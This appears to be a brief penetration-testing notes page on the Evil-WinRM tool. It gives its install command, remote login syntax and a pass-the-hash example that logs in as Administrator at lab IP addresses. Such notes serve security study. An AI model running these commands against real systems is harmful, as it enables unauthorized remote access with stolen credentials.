# Evil-WinRM

* Tool used for \[\[WinRM Attacks|WinRM]]

### Installing Evil-WinRM

```shell-session
sudo gem install evil-winrm
```

### Evil-WinRM Usage

```shell-session
evil-winrm -i <target-IP> -u <username> -p <password>
```

```shell-session
evil-winrm -i 10.129.42.197 -u user -p password
```

### Pass-the-Hash

**Pass-the-Hash with Evil-WinRM Example**

```shell-session
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```
